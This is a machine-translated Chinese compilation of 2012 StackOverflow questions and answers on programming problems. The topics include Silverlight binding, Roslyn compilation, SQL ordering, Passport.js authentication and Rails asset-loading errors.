# StackOverflow 问答 13280000-13280999

# silverlight - Silverlight 5 INotify OnPropertyChanged 未触发？

> ID：13280000
> 
> 赞同：0
> 
> 时间：2012-11-07T23:21:33.183
> 
> 标签：silverlight, binding

如果我将 TextBox 绑定到对象的（商品是对象）属性，例如：

Text="{绑定路径=商品数量，模式=TwoWay}

```
<TextBox x:Name="QuantityTextBox" Grid.Column="1" Grid.Row="5" Width="70" Text="{Binding Path=Merchandise.Quantity, Mode=TwoWay, TargetNullValue='0', FallbackValue='0', ValidatesOnExceptions=True, ValidatesOnDataErrors=True, NotifyOnValidationError=True}"/> 
```

DataContext 设置为我的 ViewModel，其中包含（以及其他属性）类型 Merchandise 的声明属性。

```
 Implements INotifyPropertyChanged, IDataErrorInfo

Public Event PropertyChanged As PropertyChangedEventHandler Implements INotifyPropertyChanged.PropertyChanged

Public Sub OnPropertyChanged(ByVal e As PropertyChangedEventArgs)

    If PropertyChangedEvent IsNot Nothing Then

        RaiseEvent PropertyChanged(Me, e)

        Select Case e.PropertyName

            Case "Merchandise"

                DoSomething()

            Case Else

        End Select

    End If

End Sub

 Private _Merchandise As DC.SL.Services.WebServiceMerchandise.Merchandise
Public Property Merchandise() As DC.SL.Services.WebServiceMerchandise.Merchandise
    Get
        Return _Merchandise
    End Get
    Set(ByVal value As DC.SL.Services.WebServiceMerchandise.Merchandise)
        _Merchandise = value
        OnPropertyChanged(New PropertyChangedEventArgs("Merchandise"))
    End Set
End Property 
```

当我在 TextBox 中输入更改时，不会触发 PropertyChanged 事件。我可以解决这个问题的唯一方法是在我的 ViewModel 中创建重复的属性...即 Quantity，然后当单击 Ok 按钮时，我将 ViewModel 属性分配给我的 Merchandise 对象。但这绝对不是有效的，似乎违背了能够使用 Path=SomeObject.Property 进行绑定的目的。

关于如何解决这个问题的任何提示？

谢谢，罗伯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-19T13:22:17.600

你需要在你的类`PropertyChanged`的属性上引发一个事件。`Merchandise`因此该类需要实现`INotifyPropertyChanged`接口以及您的视图模型类。否则，UI 不知道有任何变化。

# mule - Mule 3.3.0 请求-回复每 100 毫秒吐一次日志

> ID：13280007
> 
> 赞同：0
> 
> 时间：2012-11-07T23:22:06.873
> 
> 标签：mule

Mule 3.3.0 请求-回复每 100 毫秒吐出一次日志。

```
 <request-reply timeout="60000">
                <jms:outbound-endpoint queue="mviq.121.order" />
                <jms:inbound-endpoint queue="mviq.121.reply" />
            </request-reply> 
```

Mule 3.1 中的相同代码很安静。如何停止这些日志语句？

以下是它不断吐出的日志——

```
 18:17:12.144 [..mviProxyService.asyncReplies] DEBUG o.mule.routing.EventProcessingThread - Found 0  objects in store
      18:17:12.244 [..mviProxyService.asyncReplies] DEBUG o.mule.routing.EventProcessingThread - Found 0 objects in store
      18:17:12.344 [..mviProxyService.asyncReplies] DEBUG o.mule.routing.EventProcessingThread - Found 0 objects in store
      18:17:12.444 [..mviProxyService.asyncReplies] DEBUG o.mule.routing.EventProcessingThread - Found 0 objects in store
      18:17:12.544 [..mviProxyService.asyncReplies] DEBUG o.mule.routing.EventProcessingThread - Found 0 objects in store 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T03:13:25.057

这适用于 MuleStudio，创建一个文件 src/main/app/log4j.properties，其中包含如下内容：

```
log4j.rootCategory=WARN, console
log4j.appender.console=org.apache.log4j.ConsoleAppender
log4j.appender.console.layout=org.apache.log4j.PatternLayout 
log4j.appender.console.layout.ConversionPattern=%-5p %d [%t] %c: %m%n
log4j.logger.org.apache=WARN
log4j.logger.org.hibernate.engine.StatefulPersistenceContext.ProxyWarnLog=ERROR
log4j.logger.org.springframework.beans.factory=WARN  
log4j.logger.org.mule=WARN
log4j.logger.com.mycompany=WARN 
```

# c# - 如何使用 Roslyn 编译 C# 解决方案？

> ID：13280008
> 
> 赞同：28
> 
> 时间：2012-11-07T23:22:06.470
> 
> 标签：c#, roslyn

我有一个基于用户操作为 C# 项目生成代码的软件。我想创建一个 GUI 来自动编译解决方案，这样我就不必加载 Visual Studio 来触发重新编译。

我一直在寻找与 Roslyn 一起玩的机会，并决定尝试使用 Roslyn 而不是 msbuild 来执行此操作。不幸的是，我似乎找不到任何以这种方式使用 Roslyn 的好资源。

谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-01-26T06:40:52.820

您可以使用 加载解决方案`Roslyn.Services.Workspace.LoadSolution`。完成此操作后，您需要按依赖顺序遍历每个项目，获取`Compilation`项目并调用`Emit`它。

您可以使用如下代码按依赖顺序获取编译。（是的，我知道必须强制转换为 IHaveWorkspaceServices 很糟糕。我保证在下一个公开版本中会更好）。

```
using Roslyn.Services;
using Roslyn.Services.Host;
using System;
using System.Collections.Generic;
using System.IO;

class Program
{
    static void Main(string[] args)
    {
        var solution = Solution.Create(SolutionId.CreateNewId()).AddCSharpProject("Foo", "Foo").Solution;
        var workspaceServices = (IHaveWorkspaceServices)solution;
        var projectDependencyService = workspaceServices.WorkspaceServices.GetService<IProjectDependencyService>();
        var assemblies = new List<Stream>();
        foreach (var projectId in projectDependencyService.GetDependencyGraph(solution).GetTopologicallySortedProjects())
        {
            using (var stream = new MemoryStream())
            {
                solution.GetProject(projectId).GetCompilation().Emit(stream);
                assemblies.Add(stream);
            }
        }
    }
} 
```

注意 1：`LoadSolution`仍然在幕后使用 msbuild 来解析 .csproj 文件并确定文件/引用/编译器选项。

注意 2：由于 Roslyn 尚未完成语言，当您尝试此操作时，可能会有项目无法成功编译。

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2016-02-06T00:26:07.880

我还想即时编译一个完整的解决方案。根据[Kevin Pilch-Bisson 的回答](https://stackoverflow.com/users/678625/kevin-pilch-bisson)和[Josh E 的评论](https://stackoverflow.com/users/105566/josh-e)，我编写了代码来编译自身并将其写入文件。

**使用的软件**

Visual Studio 社区 2015 更新 1

Microsoft.CodeAnalysis v1.1.0.0（使用带有命令的包管理器控制台安装`Install-Package Microsoft.CodeAnalysis`）。

**代码**

```
using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.Emit;
using Microsoft.CodeAnalysis.MSBuild;

namespace Roslyn.TryItOut
{
    class Program
    {
        static void Main(string[] args)
        {
            string solutionUrl = "C:\\Dev\\Roslyn.TryItOut\\Roslyn.TryItOut.sln";
            string outputDir = "C:\\Dev\\Roslyn.TryItOut\\output";

            if (!Directory.Exists(outputDir))
            {
                Directory.CreateDirectory(outputDir);
            }

            bool success = CompileSolution(solutionUrl, outputDir);

            if (success)
            {
                Console.WriteLine("Compilation completed successfully.");
                Console.WriteLine("Output directory:");
                Console.WriteLine(outputDir);
            }
            else
            {
                Console.WriteLine("Compilation failed.");
            }

            Console.WriteLine("Press the any key to exit.");
            Console.ReadKey();
        }

        private static bool CompileSolution(string solutionUrl, string outputDir)
        {
            bool success = true;

            MSBuildWorkspace workspace = MSBuildWorkspace.Create();
            Solution solution = workspace.OpenSolutionAsync(solutionUrl).Result;
            ProjectDependencyGraph projectGraph = solution.GetProjectDependencyGraph();
            Dictionary<string, Stream> assemblies = new Dictionary<string, Stream>();

            foreach (ProjectId projectId in projectGraph.GetTopologicallySortedProjects())
            {
                Compilation projectCompilation = solution.GetProject(projectId).GetCompilationAsync().Result;
                if (null != projectCompilation && !string.IsNullOrEmpty(projectCompilation.AssemblyName))
                {
                    using (var stream = new MemoryStream())
                    {
                        EmitResult result = projectCompilation.Emit(stream);
                        if (result.Success)
                        {
                            string fileName = string.Format("{0}.dll", projectCompilation.AssemblyName);

                            using (FileStream file = File.Create(outputDir + '\\' + fileName))
                            {
                                stream.Seek(0, SeekOrigin.Begin);
                                stream.CopyTo(file);
                            }
                        }
                        else
                        {
                            success = false;
                        }
                    }
                }
                else
                {
                    success = false;
                }
            }

            return success;
        }
    }
} 
```

# c# - C#解析具有每行动态字段数的平面文件的最佳方法

> ID：13280011
> 
> 赞同：0
> 
> 时间：2012-11-07T23:22:10.913
> 
> 标签：c#, file, parsing, ssis

我有一个用管道分隔的平面文件，看起来像这样

ColA|ColB|3*|注1|注2|注3|2**|A1|A2|A3|B1|B2|B3

前两列已设置并且将始终存在。

* 表示该计数之后将有多少重复字段的计数，因此注释 1 2 3

** 表示一个字段块重复的次数，一个块中总是有 3 个字段。

这是每行，因此每行可能有不同数量的字段。

希望到目前为止这是有道理的。

我正在尝试找到解析此文件的最佳方法，任何建议都会很棒。

最后的目标是将所有这些字段映射到几个不同的文件中——数据转换。我实际上是在 SSIS 中完成所有这些工作，但认为默认组件不够好，因此需要编写自己的代码。

更新我实际上是在尝试像读取源文件一样读取它，并对中间的一些字段进行一些查找和字符串操作，并像在任何普通文件到文件转换 SSIS 包中一样吐出几个不同的文件。

使用上面的示例，我可能想创建一个最终看起来像这样的新文件

"ColA","HardcodedString","Note1CRLFNote2CRLF","ColB"

然后另一个文件

第 1 行：“ColA”、“A1”、“A2”、“A3”

第 2 行：“ColA”、“B1”、“B2”、“B3”

所以我想我想知道如何解析这个以及将数据存储在堆栈或列表中还是？玩，以后吐出来。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T23:34:41.647

一种可能性是使用堆栈。首先，你用管道分割线。

```
var stack = new Stack<string>(line.Split('|')); 
```

然后从堆栈中弹出前两个以将它们移开。

```
stack.Pop();
stack.Pop(); 
```

然后解析下一个元素： 3* 。为此，您弹出堆栈中的下 3 个项目。使用 2** 您可以从堆栈中弹出接下来的 2 x 3 = 6 个项目，依此类推。一旦堆栈为空，您就可以停止。

```
while (stack.Count > 0)
{
    // Parse elements like 3*
} 
```

希望这足够清楚。我发现[这篇文章](http://www.dotnetperls.com/split)对于 String.Split() 非常有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T00:58:44.443

类似于下面的东西应该可以工作（这是未经测试的）

```
ColA|ColB|3*|Note1|Note2|Note3|2**|A1|A2|A3|B1|B2|B3

string[] columns = line.Split('|');
List<string> repeatingColumnNames = new List<string();
List<List<string>> repeatingFieldValues = new List<List<string>>();
if(columns.Length > 2)
{
    int repeatingFieldCountIndex = columns[2];
    int repeatingFieldStartIndex = repeatingFieldCountIndex + 1;
    for(int i = 0; i < repeatingFieldCountIndex; i++)
    {
        repeatingColumnNames.Add(columns[repeatingFieldStartIndex + i]);
    }

    int repeatingFieldSetCountIndex = columns[2 + repeatingFieldCount + 1];
    int repeatingFieldSetStartIndex =  repeatingFieldSetCountIndex + 1;

    for(int i = 0;  i < repeatingFieldSetCount; i++)
    {
        string[] fieldSet = new string[repeatingFieldCount]();

        for(int j = 0; j < repeatingFieldCountIndex; j++)
        {                             
            fieldSet[j] = columns[repeatingFieldSetStartIndex + j  + (i  * repeatingFieldSetCount))];
        }
        repeatingFieldValues.Add(new List<string>(fieldSet));
     }
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-07T23:31:29.170

```
System.IO.File.ReadAllLines("File.txt").Select(line => line.Split(new[] {'|'})) 
```

# javascript - Apache 404 错误 - Drupal

> ID：13280015
> 
> 赞同：1
> 
> 时间：2012-11-07T23:22:33.850
> 
> 标签：javascript, html, apache, drupal, mod-rewrite

我在将项目从 MAMP Pro 转移到实时 VPS 服务器时遇到一些问题。执行此事务时，我复制了所有内容（包括数据库），现在所有内容都已连接。

然而，除了首页，所有的页面都被破坏了。破碎如：

> 404 Not Found 服务器找不到请求的页面：
> 
> ***.** .* *。*/returns-calculator (port 80) 请将此错误屏幕转发到*****.** .* *.* 的网站管理员。**
> 
>  **Apache/2.2.23 (Unix) mod_ssl/2.2.23 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 服务器在 212.48.65.2 端口 80**

 **1.  重写日志：http : [//pastebin.com/j0QLePH7](http://pastebin.com/j0QLePH7)
2.  [阿帕奇日志： http](http://pastebin.com/m06D97s7) ://pastebin.com/m06D97s7
3.  .htaccess： http: [//pastebin.com/LEHugCwi](http://pastebin.com/LEHugCwi)

我已经从托管公司确认 mod_rewrite 已为网站的每个人启用并自动启用。

你能帮忙吗？

亲切的问候，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T07:30:45.910

**解决方案：**

在找到解决方案 3 天后，我再次重建了 vps，并`RewriteBase /~name`在 .htacess 中进行了简单的操作。**

# sql - SQL - 如何通过降序时间戳查询父子记录

> ID：13280016
> 
> 赞同：0
> 
> 时间：2012-11-07T23:22:36.020
> 
> 标签：sql, parent, parent-child

这是我的桌子

```
+------------+-----------+---------------+--------------+
| CommentId  | ParentId  |  Timestamp    | CommentText  |
+------------+---------+-----------+--------------------+
|          1 |      NULL |  Jan 1 2:00pm |          a   |
|          2 |      NULL |  Jan 1 2:01pm |          b   |
|          3 |         1 |  Jan 1 3:03pm |          c   |
|          4 |         2 |  Jan 1 5:00pm |          d   |
|          5 |         2 |  Jan 1 5:01pm |          e   |
|          6 |      NULL |  Jan 1 8:00pm |          f   |
|          7 |         1 |  Jan 1 7:00pm |          g   |
|          8 |         6 |  Jan 1 9:04pm |          h   |
|          9 |         1 |  Jan 1 8:05pm |          i   |
|         10 |      NULL |  Jan 1 9:04pm |          k   |
+------------+-----------+---------------+--------------+ 
```

目前我正在使用以下 SQL 来返回父级排序的评论

```
SELECT c.*
FROM Comments c
ORDER BY COALESCE(c.ParentId, c.Id) 
```

结果是这样的：

```
+------------+-----------+---------------+--------------+
| CommentId  | ParentId  |  Timestamp    | CommentText  |
+------------+---------+-----------+--------------------+
|          1 |      NULL |  Jan 1 2:00pm |          a   |
|          3 |         1 |  Jan 1 3:03pm |          c   |
|          7 |         1 |  Jan 1 7:00pm |          g   |
|          9 |         1 |  Jan 1 8:05pm |          i   |    
|          2 |      NULL |  Jan 1 2:01pm |          b   |    
|          4 |         2 |  Jan 1 5:00pm |          d   |
|          5 |         2 |  Jan 1 5:01pm |          e   |
|          6 |      NULL |  Jan 1 8:00pm |          f   |    
|          8 |         6 |  Jan 1 9:04pm |          h   |    
|         10 |      NULL |  Jan 1 9:04pm |          k   |
+------------+-----------+---------------+--------------+ 
```

我需要以降序时间戳顺序获取结果。结果集应如下所示：

```
 +------------+-----------+---------------+--------------+
| CommentId  | ParentId  |  Timestamp    | CommentText  |
+------------+---------+-----------+--------------------+         
|         10 |      NULL |  Jan 1 9:04pm |          k   |
|          6 |      NULL |  Jan 1 8:00pm |          f   |    
|          8 |         6 |  Jan 1 9:04pm |          h   |    
|          2 |      NULL |  Jan 1 2:01pm |          b   |    
|          5 |         2 |  Jan 1 5:01pm |          e   |
|          4 |         2 |  Jan 1 5:00pm |          d   |
|          1 |      NULL |  Jan 1 2:00pm |          a   |
|          9 |         1 |  Jan 1 8:05pm |          i   |
|          7 |         1 |  Jan 1 7:00pm |          g   |
|          3 |         1 |  Jan 1 3:03pm |          c   |    
+------------+-----------+---------------+--------------+ 
```

以下不起作用：

```
SELECT c.*
FROM Comments c
ORDER BY COALESCE(c.ParentId, c.Id), Timestamp DESC 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T20:02:40.223

我认为此查询按您想要的顺序返回行：

```
SELECT c.*
FROM Comments c
ORDER BY
  COALESCE(ParentID, ID) DESC,
  ParentID is not null,
  Timestamp DESC 
```

如果 ParentID 不为 null，它会按降序对行进行排序，否则按 ID 排序，然后有 null 的行排在最前面，然后按时间戳降序排列。

# python - Python更新循环

> ID：13280017
> 
> 赞同：0
> 
> 时间：2012-11-07T23:22:42.687
> 
> 标签：python, loops

我的程序需要一个数学输入并在继续之前检查它是否有错误，这是我需要帮助的代码部分：

```
expression= introduction()#just asks user to input a math expression    
operators= set("*/+-")
numbers= set("0123456789")
for i in expression:
    while i not in numbers and i not in operators:
        print("Please enter valid inputs, please try again.")
        expression= introduction() 
```

现在我已经设置了一个错误循环，但我遇到的问题是我不知道在这种情况下用什么来更新循环。任何人？

我需要一些简单的东西，例如下面答案中的“while True”代码。其余的都太先进了。我需要与此 OP 中发布的代码接近的东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T23:32:36.647

我会这样做：

```
valid = operators | numbers
while True:
    expression = introduction()
    if set(expression) - valid:
        print 'not a valid expression, try again'
    else: 
        break 
```

您只想调用`introduction()`一次 bad `expression`。你现在这样做的方式是`introduction()`调用`expression`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T23:33:38.563

```
expression = introduction()    
operators = {'*', '/', '+', '-'}
while any(not char.isnumeric() and char not in operators for char in expression):
    print("Please enter valid inputs, please try again.")
    expression = introduction() 
```

# c++ - 我正在尝试为我的班级的扫雷游戏创建启动画面

> ID：13280019
> 
> 赞同：0
> 
> 时间：2012-11-07T23:22:43.953
> 
> 标签：c++, user-interface, splash-screen

我有点超越这里。我的任务是为我的 C++ 课程创建一个伪扫雷游戏。所有的根编码都完成了，我现在要做的就是为它创建一个很酷的菜单。目前我只有这个：

```
 #include <iostream>
 #include <cstdlib>

 using namespace std;

 bool menu ()
 {
 int inpt;

 bool exitVar;

 system("cls");

 cout << "               _       _   _   _       _   _ _ _  " << endl
      << "              |_|_   _|_| |_| |_|_    |_| |_|_|_| " << endl
      << "              |_|_|_|_|_| |_| |_|_|_  |_| |_|_    " << endl
      << "              |_| |_| |_| |_| |_| |_|_|_| |_|_|   " << endl
      << "              |_|     |_| |_| |_|   |_|_| |_|_ _  " << endl
      << "              |_|     |_| |_| |_|     |_| |_|_|_| " << endl
      << "               _ _   _       _   _ _ _   _ _ _   _ _     _ _ _   _ _      " << endl
      << "             _|_|_| |_|     |_| |_|_|_| |_|_|_| |_|_|_  |_|_|_| |_|_|_    " << endl
      << "            |_|_    |_|  _  |_| |_|_    |_|_    |_|_|_| |_|_    |_|_|_|   " << endl
      << "              |_|_  |_|_|_|_|_| |_|_|   |_|_|   |_|_|   |_|_|   |_|_|_    " << endl
      << "             _ _|_| |_|_| |_|_| |_|_ _  |_|_ _  |_|     |_|_ _  |_| |_|_  " << endl
      << "            |_|_|   |_|     |_| |_|_|_| |_|_|_| |_|     |_|_|_| |_|   |_| " << endl;

 cout << "\n            Welcome to Psuedo Mine Sweeper!!\n\n\n\n";

 cout << "Please choose from one of the following options:\n";
 cout << "1 - Play Psuedo Mine Sweeper!\n";
 cout << "2 - Exit Program :(\n\n";
 cout << "(1 or 2):";
 cin >> inpt;

 while (inpt < 1 || inpt > 2 || cin.fail())
 {
     cin.clear();
     cin.ignore();

     cout << "Please enter a valid menu choice : ";
     cin >> inpt;
 }   

 if (inpt = 1)
     exitVar = true;
 else
     exitVar = false;
 return exitVar;
 } 
```

很简单。我想要做的是创建一个屏幕，用户可以使用 UP 和 DOWN 键盘键选择 START 或 EXIT，然后按 ENTER 确认他们的选择。我认为这将通过 Java 中的事件或类似的东西来完成。但是在 C++ 中，我不知道该怎么做。我所需要的只是一些入门帮助。我的 C++ 介绍书没有涵盖这样的内容。

同样，我希望创建一个简单的启动画面，类似于您在旧任天堂游戏或其他东西中找到的内容。我会在自己周围做一些游戏，但我认为这是一个要求朝着正确方向前进的好地方。

我在这里先向您的帮助表示感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:28:04.493

您完成此操作的方式取决于平台。如果您只是使用控制台，您可能希望使用某种库来帮助设置文本样式（例如反转所选菜单项的字符和背景）。我对这些都不是很熟悉，但尝试搜索 curses 库作为从哪里开始的示例。

这并不像听起来那么容易。根据库的工作方式，您需要在用户发送输入时重新绘制初始屏幕，存储当前选择的菜单项索引，并根据是否选择该菜单项有选择地重新着色该菜单项。

获取输入也将取决于平台，尤其是获取箭头键输入对于控制台来说是棘手的。使用数字要容易得多，因为您可以读入一个字符并将其用作菜单索引（即，如果用户按 1 键，则选择第一个菜单索引）。

# node.js - Passport.js 身份验证未执行

> ID：13280024
> 
> 赞同：3
> 
> 时间：2012-11-07T23:22:53.417
> 
> 标签：node.js, coffeescript, express, oauth-2.0

我尝试将 passport.js 与我的骨干应用程序一起使用来通过 Facebook 应用程序进行身份验证。我可以让路由 /auth/facebook 通过我客户端上的 href-tag 工作。

但我想通过ajax进行身份验证。我试图创建一个调用 authenticate 方法的 express.js 路由。似乎从未调用过身份验证。

```
express = require('express')
routes = require('./routes')
mongo = require('mongoskin')
crypto = require('crypto')
fs = require('fs')

passport = require('passport')

FBStrategy = require('passport-facebook').Strategy
LocalStrategy = require('passport-local').Strategy

passport.serializeUser (user,done)->
    done(null, user)

passport.deserializeUser (obj, done)->
    done null, obj

fb = new FBStrategy
    clientID: ''
    clientSecret: ''
    callbackURL: 'http://localhost:8811/auth/facebook/callback'
    (accessToken, refreshToken, profile, done) ->
        console.log 'accesstoken', accessToken
        console.log 'profile', profile
        user = {}
        done(null, user)

passport.use fb

logErrors = (err, req, res, next)->
    console.error(err.stack)
    next(err)

clientErrorHandler = (err, req, res, next)->
    if req.xhr
        res.send 500, error: 'something blew up'
    else
        next(err)

errorHandler = (err, req, res, next)->
    res.status 500
    res.render 'error', {error: err}

app.configure ()->
  app.set 'views', __dirname + '/views'
  app.set 'view engine', 'jade'
  app.set 'name','tapuna'
  app.use express.bodyParser({uploadDir: './uploads'})
  app.use express.methodOverride()
  app.use express.cookieParser()
  app.use express.session({secret: 'tapcat'})
  app.use passport.initialize()
  app.use passport.session()
  app.use express.favicon()
  app.use logErrors
  app.use clientErrorHandler
  app.use errorHandler
  app.use express.static(__dirname + '/public.optimized')
  app.use app.router

app.configure 'development', () ->
  app.use(express.errorHandler({ dumpExceptions: true, showStack: true }))

app.configure 'production', () ->
  app.use(express.errorHandler())

# this route works fine
app.get '/auth/facebook', passport.authenticate('facebook', {scope:['email']})
# this one also
app.get '/auth/facebook/callback', passport.authenticate('facebook', {successRedirect:'/', faiureRedirect: '/login'})

# the 'ajax route'
app.post('/fb_login',
    (req,res,next)->
        console.log 'fb_login called' # i see this one
        passport.authenticate('facebook',{scope:['email']}, (err,user,info)->
            console.log 'fb'  # but i never see this one
        )(req, res, next)
    ,
    (err, req,res,next)->
        console.log 'err', err
        res.send status: 'err', message: err
) 
```

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T21:02:00.730

您无法通过 ajax 进行身份验证。OAuth 要求将用户重定向到身份验证服务器 - 这是 OAuth 流程中的关键步骤。您的 ajax 调用会进行重定向，但用户不会看到它，因为它不在浏览器中。

# ajax - 连接 doc.ready 期间不存在的 Ajax.BeginForm？

> ID：13280026
> 
> 赞同：0
> 
> 时间：2012-11-07T23:22:59.817
> 
> 标签：ajax, asp.net-mvc, jquery, unobtrusive-ajax

我有一个通过 Ajax.ActionLink 加载 Partial 的 MVC 页面，它可以工作，然后加载的 Partial 包含一个具有 Ajax.BeginForm 的表单。此表单没有连接到不显眼的 ajax，而是执行页面刷新（我在浏览器的网络日志中验证了这一点，当我单击提交时显示发起者是浏览器而不是 jquery）。

我认为问题在于，由于加载页面时表单不存在（但后来通过 Ajax.ActionLink 添加），所以不显眼的 ajax 没有在新添加的表单上看到 data-ajax 属性和连接必要的事件。我假设这只发生在 document.ready 中，并且当时不存在 ajax 表单。

**有什么我可以说的“嘿，Unobtrusive Ajax，请再次查看我的页面，因为我有一些用 data-ajax 标记的新元素并将它们连接起来”？**

谢谢。

查看不显眼的 ajax 源代码，它有：

```
$("form[data-ajax=true]").live("submit", function (evt) {
        var clickInfo = $(this).data(data_click) || [];
        evt.preventDefault();
... 
```

生成的表单标签如下所示：

```
<form action="/Path/Create" class="form-horizontal" data-ajax="true" data-ajax-method="post" data-ajax-mode="replace" data-ajax-update="#ParentContainer" id="PathForm" method="post" novalidate="novalidate"> 
```

据我所知，.live 事件上的选择器应该在新表单加载到页面上时拾取它。然而，该表单位于引导模式内，所以我不知道这是否会阻止事件以某种方式冒泡。

我什至可以在 Chrome 控制台中运行它：

```
 $("form[data-ajax=true]").live("submit", function (evt) {
            var clickInfo = $(this).data(data_click) || [];
            evt.preventDefault(); }); 
```

它成功返回表单元素，但是当我单击提交时，它仍然会刷新整个页面。我希望它至少不会做任何事情，因为我将它连接到 preventDefault。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T18:54:54.507

要回答我自己关于不显眼的 ajax 和动态加载的内容的问题，**它应该可以开箱即用。*它使用 .live(deprecated, still works current* )连接到事件的方式应该检测动态加载到页面上的表单。** 因此，显然它不会遇到与不显眼的验证相同的问题。

我们的问题与此无关。我们使用的是引导模式，它从表单内部生成了一个模式 div。由于模态然后加载了另一个包含表单的页面，我们意识到我们在一个表单中有一个表单（尽管它看起来并不像那样，因为另一个表单在模态中）。

为了解决这个问题，我们将第一个表单中模态 div 的声明移到表单之外。我们仍然可以有一个引用模态框的链接来显示它，但不是模态框的内部表单不会嵌套在第一个表单中。

我相信这导致 .live 和 .on 方法都没有捕获事件的原因是因为它们依赖于事件来冒泡到文档，并且它只冒泡到不是 ajax 表单的外部表单，因此与选择器不匹配。

另一种解决方案是编写 .on 更像这样，这样当事件冒泡到内部表单的容器时就会被捕获，而不是将其范围限定在事件首先到达外部表单的文档中。

```
$('#innerModalId').on("submit", "form[data-ajax=true]", function (evt) {
   evt.preventDefault(); 
   ...
   return false 
}); 
```

然而，由于这是一个库的一部分，这不是一个理想的解决方案，因为我需要重复他们的代码。我们没有更新不显眼的 ajax： http: [//nuget.org/packages/jQuery.Ajax.Unobtrusive](http://nuget.org/packages/jQuery.Ajax.Unobtrusive)

但我认为我们仍然会遇到问题，因为即使使用 .on 由于我们的页面结构问题，它仍然无法正常工作。

# ruby-on-rails-3 - Rails 没有正确加载我的 JS - ERROR bad Request-Line `'

> ID：13280031
> 
> 赞同：3
> 
> 时间：2012-11-07T23:23:09.043
> 
> 标签：ruby-on-rails-3, asset-pipeline

我有一个 Rails 3.2.3 应用程序无法始终加载 JS 文件。我刚开始研究 JS，所以我不确定这是刚刚开始，还是从我几天前开始就一直这样。

从事该项目的另外两个人根本没有任何问题。但有时它会加载我所有的文件，有时它会跳过一些文件，似乎没有任何模式。

有时它会加载 app.js，有时则不会。与其他 js 文件相同。

我在 Rails 日志中多次看到以下内容：

错误错误请求行`'。

我在这里不知所措...

应用程序.js：

```
//= require jquery
//= require jquery_ujs
//= require util
//= require app
//= require_tree . 
```

以下是日志文件显示的内容：

```
Started GET "/assets/user_manager.js?body=1" for 127.0.0.1 at 2012-11-07 18:02:13 -0500
Served asset /user_manager.js - 200 OK (0ms)

Started GET "/assets/util.js?body=1" for 127.0.0.1 at 2012-11-07 18:02:13 -0500
Served asset /util.js - 200 OK (0ms)
[2012-11-07 18:02:13] ERROR bad Request-Line `'.
[2012-11-07 18:02:13] ERROR bad Request-Line `'.
[2012-11-07 18:02:13] ERROR bad Request-Line `'.

Started GET "/assets/header/topnav/separator.png" for 127.0.0.1 at 2012-11-07 18:02:13 -0500
Served asset /header/topnav/separator.png - 200 OK (0ms)

Started GET "/assets/header/pagetitle-bg.png" for 127.0.0.1 at 2012-11-07 18:02:13 -0500
Served asset /header/pagetitle-bg.png - 200 OK (0ms)
[2012-11-07 18:02:13] ERROR bad Request-Line `'.

Started GET "/assets/header_bg.png" for 127.0.0.1 at 2012-11-07 18:02:13 -0500
Served asset /header_bg.png - 404 Not Found (3ms)

ActionController::RoutingError (No route matches [GET] "/assets/header_bg.png"):
  actionpack (3.2.3) lib/action_dispatch/middleware/debug_exceptions.rb:21:in `call'
  actionpack (3.2.3) lib/action_dispatch/middleware/show_exceptions.rb:56:in `call'
  railties (3.2.3) lib/rails/rack/logger.rb:26:in `call_app'
  railties (3.2.3) lib/rails/rack/logger.rb:16:in `call'
  actionpack (3.2.3) lib/action_dispatch/middleware/request_id.rb:22:in `call'
  rack (1.4.1) lib/rack/methodoverride.rb:21:in `call'
  rack (1.4.1) lib/rack/runtime.rb:17:in `call'
  activesupport (3.2.3) lib/active_support/cache/strategy/local_cache.rb:72:in `call'
  rack (1.4.1) lib/rack/lock.rb:15:in `call'
  actionpack (3.2.3) lib/action_dispatch/middleware/static.rb:62:in `call'
  railties (3.2.3) lib/rails/engine.rb:479:in `call'
  railties (3.2.3) lib/rails/application.rb:220:in `call'
  rack (1.4.1) lib/rack/c[2012-11-07 18:02:13] ERROR bad Request-Line `'.
ontent_length.rb:14:in `call'
  railties (3.2.3) lib/rails/rack/log_tailer.rb:14:in `call'
  rack (1.4.1) lib/rack/handler/webrick.rb:59:in `service'
  /Users/rob/.rvm/rubies/ruby-1.9.3-p125/lib/ruby/1.9.1/webrick/httpserver.rb:138:in `service'
  /Users/rob/.rvm/rubies/ruby-1.9.3-p125/lib/ruby/1.9.1/webrick/httpserver.rb:94:in `run'
  /Users/rob/.rvm/rubies/ruby-1.9.3-p125/lib/ruby/1.9.1/webrick/server.rb:191:in `block in     start_thread'

  Rendered /Users/rob/.rvm/gems/ruby-1.9.3-p125@admin/gems/actionpack-3.2\.    3/lib/action_dispatch/middleware/templates/rescues/routing_error.erb within rescues/layout (1.1ms)

Started GET "/assets/background/header_blueprint.png" for 127.0.0.1 at 2012-11-07 18:02:13 -0500
Served asset /background/header_blueprint.png - 200 OK (0ms)

Started GET "/assets/images/ui-icons_454545_256x240.png" for 127.0.0.1 at 2012-11-07 18:02:13 -0500
Served asset /images/ui-icons_454545_256x240.png - 404 Not Found (3ms)

ActionController::RoutingError (No route matches [GET] "/assets/images/ui-icons_454545_256x240.png"):
  actionpack (3.2.3) lib/action_dispatch/middleware/debug_exceptions.rb:21:in `call'
  actionpack (3.2.3) lib/action_dispatch/middleware/show_exceptions.rb:56:in `call'
  railties (3.2.3) lib/rails/rack/logger.rb:26:in `call_app'
  railties (3.2.3) lib/rails/rack/logger.rb:16:in `call'
